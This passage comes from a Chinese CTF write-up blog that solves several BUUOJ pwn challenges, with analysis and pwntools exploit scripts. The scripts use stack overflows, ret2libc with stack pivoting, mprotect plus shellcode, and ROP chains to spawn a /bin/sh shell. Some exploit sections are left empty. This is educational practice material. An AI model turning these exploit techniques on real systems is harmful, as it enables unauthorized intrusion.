首地址为指定的位置，就能实现任意地址写了。</p><p>create那的话 chunk大小没限制，可惜这里没有输出功能不然利用mmap的特性直接泄露libc也是可以的，如果还是想的话配合劫持stdout也可以，只不过过于麻烦</p><p>覆盖调用函数，把free的got表掉包成system的plt表，不就可以执行system（堆指针）了吗？那么此时如果堆指针存着‘&#x2F;bin&#x2F;sh’，我们就可以执行system（‘&#x2F;bin&#x2F;sh’）提权了。（注意字符串实际上就是一个指针，并且结尾是‘\x00’）</p><h2 id="2-payload-1"><a href="#2-payload-1" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><p>PS:靶机的glibc版本是2.23的。 2.26版本之后加入了 tcache 机制，就没办法用常见的 fastbin 攻击。</p><h1 id="43-Black-Watch-入群题-PWN"><a href="#43-Black-Watch-入群题-PWN" class="headerlink" title="43.[Black Watch 入群题]PWN"></a>43.[Black Watch 入群题]PWN</h1><p>ret2libc+栈劫持</p><h2 id="1-分析-2"><a href="#1-分析-2" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143204092.png" alt="image-20231011143204092"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011163306913.png" alt="image-20231011163306913"></p><p>vul_function</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011163327742.png" alt="image-20231011163327742"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011172348440.png" alt="image-20231011172348440"></p><p>发现s在bss段上</p><p>分析一下这个函数，一开始输出m1里的字符串，然后调用read函数给s写入不大于0x200长度的数据，然后又是一个read函数，让我们读入0x20长度的数据给参数buf，buf参数的大小是0x18，我们可以溢出0x8字节，0x8字节，只够我们覆盖ret，没办法构造很长的rop链来攻击，所以需要将栈迁移到s中拿到shell。</p><p>所以我们将ROP链布置在那里，由于这题需要我们自己构造system(‘&#x2F;bin&#x2F;sh’)</p><p>需要先来泄露一下程序的libc版本,那么本题payload构造思路就清晰了，ret2libc+栈劫持的组合</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011203955743.png" alt="image-20231011203955743"></p><h2 id="2-payload-2"><a href="#2-payload-2" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29859</span>)<br><span class="hljs-comment">#io=process(&#x27;./43&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./43&#x27;</span>)<br><br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>padding=<span class="hljs-number">0x18</span><span class="hljs-comment">#偏移地址（这个不包含函数返回地址，只是栈大小）</span><br>s=<span class="hljs-number">0x0804A300</span><br>leave_ret=<span class="hljs-number">0x08048408</span><br><br>payload = p32(write_plt)+p32(main_addr)<br>payload += p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br><br>io.recvuntil(<span class="hljs-string">b&quot;What is your name?&quot;</span>)<br>io.send(payload)<br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload1+=p32(s-<span class="hljs-number">4</span>)+p32(leave_ret)<br><br>io.recvuntil(<span class="hljs-string">&quot;What do you want to say?&quot;</span>)<br>io.send(payload1)<br><br><span class="hljs-comment">#下面这个需要根据实际情况获取泄露函数真实地址</span><br>write_addr=u32(io.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&#x27;leak_write_real_addr =&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(write_addr)))<br>            <br><span class="hljs-comment">#以下为通用操作</span><br><span class="hljs-string">&#x27;&#x27;&#x27;libc = LibcSearcher(&quot;write&quot;,write_addr)</span><br><span class="hljs-string">libcbase=write_addr-libc.dump(&#x27;write&#x27;)</span><br><span class="hljs-string">system_addr=libcbase+libc.dump(&quot;system&quot;)</span><br><span class="hljs-string">str_bin_sh=libcbase+libc.dump(&#x27;str_bin_sh&#x27;)&#x27;&#x27;&#x27;</span><br><br>libc=ELF(<span class="hljs-string">&#x27;32libc-2.23.so&#x27;</span>)<br>libcbase=write_addr-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>str_bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>            <br>payload2 = p32(system_addr)+p32(<span class="hljs-number">0</span>)+p32(str_bin_sh)<br><br>io.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br>io.sendline(payload2)<br><br>io.recvuntil(<span class="hljs-string">&quot;say?&quot;</span>)<br>io.sendline(payload1)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="44-inndy-rop"><a href="#44-inndy-rop" class="headerlink" title="44.inndy_rop"></a>44.inndy_rop</h1><p>ret2shellcode</p><h2 id="1-分析-3"><a href="#1-分析-3" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143335686.png" alt="image-20231011143335686"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012083505794.png" alt="image-20231012083505794"></p><p>overflow</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012100240612.png" alt="image-20231012100240612"></p><p>gets溢出漏洞</p><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>发现程序中函数很多，应该是静态编译<br>查看有没有mprotect函数</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012100429085.png" alt="image-20231012100429085"></p><p>果然有，那么我们可以用这个函数改bss段权限来执行shellcode</p><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>可以直接利用ROPgadget工具来构造ROP链</p><blockquote><p>ROPgadget –binary 44 –ropchain</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012200657835.png" alt="image-20231012200657835"></p><h2 id="2-payload-3"><a href="#2-payload-3" class="headerlink" title="(2)payload"></a>(2)payload</h2><p>exp1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,29581)</span><br>io = process(<span class="hljs-string">&#x27;./44&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./44&#x27;</span>)<br><br>padding = <span class="hljs-number">0xc</span>+<span class="hljs-number">4</span><br>mprotect_addr = elf.symbols[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>read_addr = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>bss_start = elf.bss() &amp; <span class="hljs-number">0xfffff000</span>  <span class="hljs-comment"># 页对齐</span><br>bss_size = <span class="hljs-number">0x1000</span><br>rwx = <span class="hljs-number">7</span><br>pop_3times_ret = <span class="hljs-number">0x0806ecd8</span><br><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span>*padding, mprotect_addr, pop_3times_ret, bss_start,bss_size, rwx, read_addr, bss_start, <span class="hljs-number">0</span>, bss_start, bss_size])<br><br>io.sendline(payload)<br>gdb.attach(io)<br>shellcode = asm(shellcraft.sh())<br>io.send(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>exp2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27768</span>)<br><span class="hljs-comment">#io = process(&#x27;./44&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">payload</span>():<br>    <span class="hljs-comment"># Padding goes here</span><br>    p = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc</span>+<span class="hljs-string">b&#x27;bbbb&#x27;</span><br><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>    p += <span class="hljs-string">b&#x27;/bin&#x27;</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea064</span>) <span class="hljs-comment"># @ .data + 4</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>    p += <span class="hljs-string">b&#x27;//sh&#x27;</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481c9</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080de769</span>) <span class="hljs-comment"># pop ecx ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>    p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806c943</span>) <span class="hljs-comment"># int 0x80</span><br><br>    <span class="hljs-keyword">return</span> p<br><br>shell = payload()<br>io.sendline(shell)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="45-hitcontraining-uaf"><a href="#45-hitcontraining-uaf" class="headerlink" title="45.hitcontraining_uaf"></a>45.hitcontraining_uaf</h1><h2 id="1-分析-4"><a href="#1-分析-4" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231011143354723.png" alt="image-20231011143354723"></p><h2 id="2-payload-4"><a href="#2-payload-4" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="46-jarvisoj-test-your-memory"><a href="#46-jarvisoj-test-your-memory" class="headerlink" title="46.jarvisoj_test_your_memory"></a>46.jarvisoj_test_your_memory</h1><p>ret2text</p><h2 id="1-分析-5"><a href="#1-分析-5" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012105117110.png" alt="image-20231012105117110"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012110054158.png" alt="image-20231012110054158"></p><p>mem_test</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012110134281.png" alt="image-20231012110134281"></p><p>__isoc99_scanf溢出漏洞<br>同时发现hint存放着cat flag命令</p><p>win_func</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012110030347.png" alt="image-20231012110030347"></p><p>给了system函数，我们需要将hint作为system函数的参数，来获取flag，注意返回地址要选一个空地址，不能让程序崩溃，不然不会显示flag</p><h2 id="2-payload-5"><a href="#2-payload-5" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29129</span>)<br>elf = ELF(<span class="hljs-string">&quot;./46&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>flag_addr = <span class="hljs-number">0x80487E0</span><br>system_addr = elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x13</span>+<span class="hljs-number">4</span>) + p32(system_addr) + p32(<span class="hljs-number">0x8048790</span>) + p32(flag_addr)<span class="hljs-comment">#只要地址显示的伪代码为空就可以用</span><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="47-cmcc-simplerop"><a href="#47-cmcc-simplerop" class="headerlink" title="47.cmcc_simplerop"></a>47.cmcc_simplerop</h1><h2 id="1-分析-6"><a href="#1-分析-6" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012105138265.png" alt="image-20231012105138265"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012203912182.png" alt="image-20231012203912182"></p><p>read漏洞</p><p>fflush</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012203948137.png" alt="image-20231012203948137"></p><p>check_one_fd</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012204031710.png" alt="image-20231012204031710"></p><h2 id="2-payload-6"><a href="#2-payload-6" class="headerlink" title="(2)payload"></a>(2)payload</h2><p>exp1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26841</span>)<br><span class="hljs-comment">#io = process(&#x27;./47&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>padding=<span class="hljs-number">0x20</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">payload</span>():<br>    <span class="hljs-comment"># Padding goes here</span><br>p = <span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806e82a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080bae06</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">b&#x27;/bin&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0809a15d</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806e82a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080bae06</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">b&#x27;//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0809a15d</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">b&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806e850</span>) <span class="hljs-comment"># pop_edx_ecx_ebx</span><br>p += p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0x080ea060</span>)<br>p += pack(<span class="hljs-string">b&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080bae06</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += p32(<span class="hljs-number">0xb</span>)<br>p += pack(<span class="hljs-string">b&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080493e1</span>) <span class="hljs-comment"># int 0x80</span><br><br><span class="hljs-keyword">return</span> p<br><br>shell = payload()<br>io.sendline(shell)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>exp2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><p>exp3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="48-picoctf-2018-buffer-overflow-2"><a href="#48-picoctf-2018-buffer-overflow-2" class="headerlink" title="48.picoctf_2018_buffer overflow 2"></a>48.picoctf_2018_buffer overflow 2</h1><h2 id="1-分析-7"><a href="#1-分析-7" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012105153324.png" alt="image-20231012105153324"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231014141423542.png" alt="image-20231014141423542"></p><p>vuln</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231014141452804.png" alt="image-20231014141452804"></p><p>gets漏洞</p><p>win</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231014141520555.png" alt="image-20231014141520555"></p><p>可以看到win函数中a1 &#x3D;&#x3D; 0xDEADBEEF &amp;&amp; a2 &#x3D;&#x3D; 0xDEADCODE 时，输出flag.</p><h2 id="2-payload-7"><a href="#2-payload-7" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26873</span>)<br><span class="hljs-comment">#io=process(&#x27;./48&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./48&#x27;</span>)<br><br>win_addr=<span class="hljs-number">0x80485cb</span><span class="hljs-comment">#flag</span><br>vuln_addr=elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br>a1=<span class="hljs-number">0xDEADBEEF</span><br>a2=<span class="hljs-number">0xDEADC0DE</span><br>padding=<span class="hljs-number">0x70</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*padding+p32(win_addr)+p32(<span class="hljs-number">0</span>)+p32(a1)+p32(a2)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="49-wustctf2020-getshell-2"><a href="#49-wustctf2020-getshell-2" class="headerlink" title="49.wustctf2020_getshell_2"></a>49.wustctf2020_getshell_2</h1><h2 id="1-分析-8"><a href="#1-分析-8" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231012105215869.png" alt="image-20231012105215869"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231019084106789.png" alt="image-20231019084106789"></p><p>vulnerable</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231019084132586.png" alt="image-20231019084132586"></p><p>read漏洞</p><p>shell</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231019085340130.png" alt="image-20231019085340130"></p><p>没法利用<code>system@plt</code>地址，因为plt地址需要返回值，可溢出的地址位数不够<code>0x24-0x18=0xc</code>，所以只能用<code>shell()</code>里的<code>call system</code>来调用system，call函数不用返回值了，它会自己把下一条指令给压进去</p><h2 id="2-payload-8"><a href="#2-payload-8" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 